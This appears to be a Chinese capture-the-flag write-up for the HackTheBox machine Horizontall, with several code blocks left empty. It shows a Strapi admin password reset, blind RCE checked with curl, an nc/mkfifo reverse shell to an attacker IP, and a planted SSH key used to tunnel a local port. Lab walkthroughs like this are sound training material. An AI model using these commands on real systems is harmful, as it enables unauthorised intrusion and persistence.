首先使用nmap进行端口扫描

  


使用IP进行访问网页的时候会自动跳转到`horizontall.htb`页面，咱们先加到`hosts`里

  

```

echo 10.10.11.105 horizontall.htb >> /etc/hosts
```

```
┌──(root💀root)-[~/Desktop]
```

```




















┌──(root💀kali)-[~/Desktop]
```

```

echo 10.10.11.105 api-prod.Horizontall.htb >> /etc/hosts
```

然后咱们去访问一下看看

![](../Images/49931f371407d27f4949fe2afdbb638e.png)

```



























┌──(root💀kali)-[~/Desktop]
```

挨个访问看看

## 漏洞利用

将上面的exploit保存为python文件后，使用python3执行

  

```











┌──(root💀kali)-[~/Desktop]
```

  

成功将admin账号的密码重置为`Lucifiel123`

咱们去网页中登陆

![](../Images/e5c84ebbd313599db1aabe4a00e26770.png)

  

这个Exploit还有RCE功能，但是没有回显，咱们去尝试一下是否可以利用

首先本地使用python3开启一个http服务

```



┌──(root💀kali)-[~/Desktop]
```

然后在RCE里使用curl尝试访问试试

```




$> curl http://10.10.14.63/123.txt
```

然后我们返回http服务这边看看情况

```




┌──(root💀kali)-[~/Desktop]
```

成功执行了命令，看来是可以利用的。咱们开启一个nc试试

  

```

nc -nvlp 4444
```

  

然后在RCE里执行反弹shell命令

  

```

nc 10.10.14.63 4444
```

  

然后看看nc里的情况

```




┌──(root💀kali)-[~/Desktop]
```

这里倒是成功反弹回了shell，但无法成功执行命令，再反复尝试后，得到了可以利用的正确的语句

```

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.63 4444 >/tmp/f
```

```








┌──(root💀kali)-[~/Desktop]
```

查看一下是否有python

```




$ which python
```

查看后发现python和python3都是存在的，那咱们利用python获取一个交互式shell吧

```

python3 -c "import pty;pty.spawn('/bin/bash')"
```

执行后即可获得一个交互式shell

```













strapi@horizontall:~/myapi$ cd /home
```

成功拿到user用户的flag文件

## 权限提升

查看一下开启的端口

  

```













strapi@horizontall:/home/developer$ netstat -tunlp
```

  

这边可以看到开启了一个奇怪的端口`8000`端口，而我们也无法知道它是干嘛的，而且该端口还无法被访问到，咱们要想办法给他代理出来

如果想要代理出来那就是需要使用SSH功能，这边也开启了22端口，但我们没有ssh账户啊？想办法先搞他一个ssh账户出来！

首先查看一下我们当前用户`strapi`的根目录在哪里吧

```



strapi@horizontall:~/myapi$ pwd
```

突然计上心头，既然我已经拥有这个用户了，那你说我给这个用户上传一个ssh的公钥不就完了吗？说干就干，开搞

首先在本地创建ssh密钥

```









┌──(root💀kali)-[~/Desktop]
```

创建后，咱们把`id_rsa.pub`给上传到靶机里

在这之前，咱们先在目录`/opt/strapi`中创建一个目录`.ssh`

```










mkdir ~/.ssh
```

然后在本地使用python开启一个http服务器后使用wget下载，或直接使用nc进行文件传输都可以

```











strapi@horizontall:~/.ssh$ wget http://10.10.14.63/id_rsa.pub -O authorized_keys
```

成功上传上去后，在本地使用ssh进行连接

```


























┌──(root💀kali)-[~/Desktop]
```

好的，确认可以连接，现在咱们要做的事情就是将8000端口给代理出来

```























┌──(root💀kali)-[~/Desktop]
```

咱们去本地访问一下`http://127.0.0.1:8000/`看看是否代理成功

![](../Images/6089de2fd81d0da830bd053421291e78.png)

成功将8000端口代理出来并且可以进行访问，右下角给出了PHP版本号，咱们去搜索一下

![](../Images/c2dacd49253dcc2ef61e57baafe0da58.png)
